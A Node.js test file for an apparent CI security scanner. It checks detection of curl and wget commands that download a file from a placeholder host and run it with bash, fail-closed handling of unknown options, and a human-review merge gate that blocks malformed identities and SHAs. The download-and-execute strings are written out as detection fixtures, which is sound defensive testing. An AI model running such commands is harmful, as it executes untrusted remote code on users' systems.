'use strict';
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {evaluateRepairGate,evaluateFamilyResolution}=require('./ultra_sentinel_incidents.cjs');
const U='https://example.invalid/x',A='a'.repeat(40);
for(const [name,cmd] of [
 ['write-out short','curl -w -- -o payload '+U+'; bash payload'],
 ['write-out long','curl --write-out -- --output=payload '+U+'; bash payload'],
 ['cert short','curl -E -- -o payload '+U+'; bash payload'],
 ['cert long','curl --cert -- -o payload '+U+'; bash payload'],
 ['header short','curl -H -- -o payload '+U+'; bash payload'],
 ['wget agent','wget -U -- -O payload '+U+'; bash payload']
])test('round16 downloader consumes known option values '+name,()=>{
 assert.ok(findingsForScript(cmd).includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),name);
});
for(const cmd of [
 'curl --uncatalogued-option -- -o payload '+U+'; bash payload',
 'curl -Z -- -o payload '+U+'; bash payload',
 'wget --uncatalogued-option -- -O payload '+U+'; bash payload'
])test('round16 unknown downloader options fail closed',()=>{
 assert.ok(findingsForScript(cmd).includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'),cmd);
});
const variant=(kind,id)=>({kind,id,status:'passed_after_fix',testFile:'.github/scripts/ultra_sentinel_family_rule.test.cjs',...(kind==='original'?{red:'failed_before_fix'}:{})});
const family=()=>({id:'REVIEW_INPUT_VALIDATION',sha:A,
 rootCause:'User-controlled review identities and SHA can be nonstring objects or arrays.',
 scope:'Human identities and SHA fields supplied to family-level repair review decisions.',
 unresolvedConfirmed:0,knownGaps:[],unknownSyntax:'fail_closed',
 variants:[variant('original','original'),variant('alternate','alternate'),variant('boundary','boundary'),variant('benign_control','benign-control')]});
const valid=()=>({sha:A,currentSha:A,proposedBy:'bot',approvedBy:'reviewer',
 approval:'approved',tests:{red:'failed_before_fix',green:'passed_after_fix'},
 checks:{'Android build':'success','Unit Test Coverage':'success','Ultra Sentinel Core Tests':'success'},
 independentReview:'approved',familyEvidence:[family()]});
test('round16 valid human reviewed request remains eligible but never auto-merges',()=>{
 const result=evaluateRepairGate(valid());
 assert.equal(result.status,'READY_FOR_HUMAN_MERGE');assert.equal(result.autoMerge,false);
});
for(const [name,change] of [
 ['array SHA',{sha:[A]}],['object SHA',{sha:{}}],
 ['array currentSHA',{currentSha:[A]}],['object proposer',{proposedBy:{}}],
 ['array proposer',{proposedBy:[]}],['array approver',{approvedBy:[]}],
 ['object approver',{approvedBy:{}}],['empty approver',{approvedBy:' '}],
 ['space identity',{approvedBy:'bad name'}],['same user other case',{proposedBy:'USER',approvedBy:'user'}],
 ['array family sha',{familyEvidence:[{...family(),sha:[A]}]}]
])test('round16 rejects malformed '+name,()=>{
 let verdict;assert.doesNotThrow(()=>{verdict=evaluateRepairGate({...valid(),...change});});
 assert.equal(verdict.status,'BLOCKED',JSON.stringify(verdict));
 assert.equal(verdict.autoMerge,false);
});
test('round16 family resolution rejects non-string SHA argument',()=>{
 for(const sha of [[A],{value:A},null,1]){
  assert.doesNotThrow(()=>evaluateFamilyResolution([family()],{sha}));
  assert.equal(evaluateFamilyResolution([family()],{sha}).status,'BLOCKED');
 }
});
